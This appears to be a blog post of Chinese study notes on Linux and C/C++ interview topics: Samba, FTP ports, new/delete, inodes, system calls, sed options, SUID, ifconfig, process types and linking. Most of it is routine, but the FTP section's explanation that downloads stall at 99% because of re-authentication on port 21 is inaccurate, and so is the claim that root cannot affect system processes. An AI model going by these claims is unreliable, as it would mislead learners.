<h3 id="Samba"><a href="#Samba" class="headerlink" title="Samba"></a>Samba</h3><p>Samba是在Linux和UNIX系统上实现SMB协议的一个免费软件，由服务器及客户端程序构成。SMB（Server Messages Block，信息服务块）是一种在局域网上共享文件和打印机的一种通信协议。<br>WEB服务器配置文件  http.conf<br>启动脚本配置文件   initd.conf<br>samba脚本          rc.samba<br>samba服务配置文件  smb.conf</p>
<h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><p>FTP服务器有两个端口，其中21端口用于连接，20端口用于传输数据<br>进行FTP文件传输中，客户端首先连接到FTP服务器的21端口，进行用户的认证，认证成功后，要传输文件时，服务器会开一个端口为20来进行传输数据文件。<br>也就是说，端口20才是真正传输所用到的端口，端口21只用于FTP的登陆认证。我们平常下载文件时，会遇到下载到99%时，文件不完成，不能成功的下载。其实是因为文件下载完毕后，还要在21端口再行进行用户认证，而下载文件的时间如果过长，客户机与服务器的21端口的连接会被服务器认为是超时连接而中断掉，就是这个原因。解决方法就是设置21端口的响应时间。</p>
<h3 id="malloc-free和new-delete的本质区别："><a href="#malloc-free和new-delete的本质区别：" class="headerlink" title="malloc/free和new/delete的本质区别："></a>malloc/free和new/delete的本质区别：</h3><p>1.malloc/free 是C/C++语言的标准库函数，new/delete是C++的运算符<br>2.new 能自动分配空间大小<br>3.对于用户自定义的对象而言，用malloc/free无法满足动态管理对象的要求<br>    对象在创建的时候会自动调用构造函数，对象在消亡之前自动执行析构函数<br>    由于malloc/free是库函数而不是运算符，不在编译器的控制范围，不能把构<br>    造函数和析构函数的任务强加于malloc/free 。一次C++需要一个能够对对象完<br>    成动态分配内存和初始化工作的运算符new，以及一个释放内存的运算符<br>    delete。简单来说就是new/delete能完成跟家详细的对内存的操作，而malloc/<br>    free不能。</p>
<h3 id="Quota"><a href="#Quota" class="headerlink" title="Quota"></a>Quota</h3><p>Linux的一个重要工具-Quota。安装后， 这两个配置文件都是初始化数据库自动生成。<br>aquota.group与aqouta.user分别是组以及用户磁盘配额需要的配置文件</p>
<h3 id="i-节点"><a href="#i-节点" class="headerlink" title="i 节点"></a>i 节点</h3><p>在做这道题之前首先要明白i节点是什么东西！<br>linux中，文件查找不是通过文件名称来查找的。实际上是通过i节点来实现文件的查找定位的。我们可以形象的将i节点看做是一个指针fip.<br>这个节点和文件不是一一对应的，通过ln可以建立其他的节点。</p>
<h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><p>系统调用把应用程序的请求传输给系统内核执行<br>利用系统调用能够得到操作系统提供的多种服务<br>是操作系统提供给编程人员的接口<br>系统调用给用户屏蔽了设备访问的细节<br>系统调用保护了一些只能在内核模式执行的操作指令</p>
<p>用户空间与系统空间所在的内存区间不一样，同样，对于这两种区间，CPU的运行状态也不一样。 在用户空间中，CPU处于”用户态”；在系统空间中，CPU处于”系统态”，系统态又可称为核心态。</p>
<h3 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h3><p>sed是非交互式的编辑器。它不会修改文件，除非使用shell重定向来保存结果。默认情况下，所有的输出行都被打印到屏幕上。sed编辑器逐行处理文件（或输入），并将结果发送到屏幕。<br>sed命令行格式为：<br>    sed [-nefri] ‘command’ 输入文本<br>常用选项：<br>    -n∶使用安静(silent)模式。在一般 sed 的用法中，所有来自 STDIN的资料一般都会被列出到萤幕上。但如果加上 -n 参数后，则只有经过sed 特殊处理的那一行(或者动作)才会被列出来。<br>    -e∶直接在指令列模式上进行 sed 的动作编辑；<br>    -f∶直接将 sed 的动作写在一个档案内， -f filename 则可以执行 filename 内的sed 动作；<br>    -r∶sed 的动作支援的是延伸型正规表示法的语法。(预设是基础正规表示法语法)<br>    -i∶直接修改读取的档案内容，而不是由萤幕输出。<br>常用命令：<br>    a   ∶新增， a 的后面可以接字串，而这些字串会在新的一行出现(目前的下一行)～<br>    c   ∶取代， c 的后面可以接字串，这些字串可以取代 n1,n2 之间的行！<br>    d   ∶删除，因为是删除啊，所以 d 后面通常不接任何咚咚；<br>    i   ∶插入， i 的后面可以接字串，而这些字串会在新的一行出现(目前的上一行)；<br>    p  ∶列印，亦即将某个选择的资料印出。通常 p 会与参数 sed -n 一起运作～<br>    s  ∶取代，可以直接进行取代的工作哩！通常这个 s 的动作可以搭配正规表示法！例如 1,20s/old/new/g！<br>    g 是行内进行全局替换</p>
<p>/pattern: 从光标开始处向文件尾搜索pattern<br>?pattern: 从光标开始处向文件首搜索pattern<br>n: 在同一方向重复上一次搜索命令<br>N: 在反方向上重复上一次搜索命令<br>:s/p1/p2/g: 将当前行中所有p1均用p2替代<br>:n1,n2s/p1/p2/g: 将第n1至n2行中所有p1均用p2替代<br>:g/p1/s//p2/g: 将文件中所有p1均用p2替换</p>
<p><strong>打印文件（demo.log）中包含ERP的行到标准输出</strong><br>sed -n ‘/ERP/p’ demo.log</p>
<h3 id="tail"><a href="#tail" class="headerlink" title="tail"></a>tail</h3><p>linux 下 tail 用于看档案的结尾， -f参数 是follow的意思 当文件增长时,输出后续添加的数据</p>
<h3 id="文件系统权限中的SUID"><a href="#文件系统权限中的SUID" class="headerlink" title="文件系统权限中的SUID"></a>文件系统权限中的SUID</h3><p>当一个设置了SUID 位的可执行文件被执行时，无论谁来执行这个文件，他都暂时拥有文件所有者的权限<br>可以通过chmod u+s 命令设置SUID属性<br>passwd命令就是通过SUID机制，在任何用户修改密码时，有权限访问密码存储文件</p>
<h3 id="ifconfig"><a href="#ifconfig" class="headerlink" title="ifconfig"></a>ifconfig</h3><p>1.作用：ifconfig用于查看和更改网络接口的地址和参数，包括IP地址、网络掩码、广播地址，使用权限是超级用户。<br>2.格式    ifconfig -interface [options] address<br>3.主要参数如下：<br>-interface：指定的网络接口名，如eth0和eth1。<br>up：激活指定的网络接口卡。<br>down：关闭指定的网络接口。<br>broadcast address：设置接口的广播地址。<br>pointopoint：启用点对点方式。<br>address：设置指定接口设备的IP地址。<br>netmask address：设置接口的子网掩码。</p>
<h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><p>就绪指的是进程三状态之一。<br>按照进程的功能和运行的程序分类，进程可划分为两大类：<br>(1) 系统进程：可以执行内存资源分配和进程切换等管理工作；而且，该进程的运行不受用户的干预，即使是root用户也不能干预系统进程的运行。<br>(2) 用户进程：通过执行用户程序、应用程序或内核之外的系统程序而产生的进程，此类进程可以在用户的控制下运行或关闭。</p>
<p>针对用户进程，又可以分为交互进程、批处理进程和守护进程三类。<br>(1) 交互进程：由一个shell终端启动的进程，在执行过程中，需要与用户进行交互操作，可以运行于前台，也可以运行在后台。<br>(2) 批处理进程：该进程是一个进程集合，负责按顺序启动其他的进程。<br>(3) 守护进程：守护进程是一直运行的一种进程，经常在linux系统启动时启动，在系统关闭时终止。它们独立于控制终端并且周期性的执行某种任务或等待处理某些发生的事件。例如httpd进程，一直处于运行状态，等待用户的访问。还有经常用的crond进程，这个进程类似与windows的计划任务，可以周期性的执行用户设定的某些任务。</p>
<h3 id="内核"><a href="#内核" class="headerlink" title="内核"></a>内核</h3><p>内核分为进程管理子系统，内存管理子系统，io管理子系统，文件管理子系统</p>
<h3 id="静态链接库、动态链接库"><a href="#静态链接库、动态链接库" class="headerlink" title="静态链接库、动态链接库"></a>静态链接库、动态链接库</h3><p>1静态链接库的优点 </p>
<p> (1)代码装载速度快，执行速度略比动态链接库快； </p>
<p> (2)只需保证在开发者的计算机中有正确的.LIB文件，在以二进制形式发布程序时不需考虑在用户的计算机上.LIB文件是否存在及版本问题，可避免DLL地狱等问题。 </p>
<p>2动态链接库的优点 </p>
<p> (1)更加节省内存并减少页面交换；</p>
<p> (2) DLL文件与EXE文件独立，只要输出接口不变（即名称、参数、返回值类型和调用约定不变），更换DLL文件不会对EXE文件造成任何影响，因而极大地提高了可维护性和可扩展性；</p>
<p> (3)不同编程语言编写的程序只要按照函数调用约定就可以调用同一个DLL函数；</p>
<p> (4)适用于大规模的软件开发，使开发过程独立、耦合度小，便于不同开发者和开发组织之间进行开发和测试。</p>
<p>3不足之处</p>
<p> (1)使用静态链接生成的可执行文件体积较大，包含相同的公共代码，造成浪费；</p>
<p> (2)使用动态链接库的应用程序不是自完备的，它依赖的DLL模块也要存在，如果使用载入时动态链接，程序启动时发现DLL不存在，系统将终止程序并给出错误信息。而使用运行时动态链接，系统不会终止，但由于DLL中的导出函数不可用，程序会加载失败；速度比静态链接慢。当某个模块更新后，如果新模块与旧的模块不兼容，那么那些需要该模块才能运行的软件，统统撕掉。这在早期Windows中很常见。</p>
<h3 id="volatile"><a href="#volatile" class="headerlink" title="volatile"></a>volatile</h3><p>volatile是一个类型修饰符（type specifier）作用是作为指令关键字，确保本条指令不会因编译器的优化而省略，且要求每次直接读值。<br>volatile的变量是说这变量可能会被意想不到地改变，这样，编译器就不会去假设这个变量的值了。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
</search>
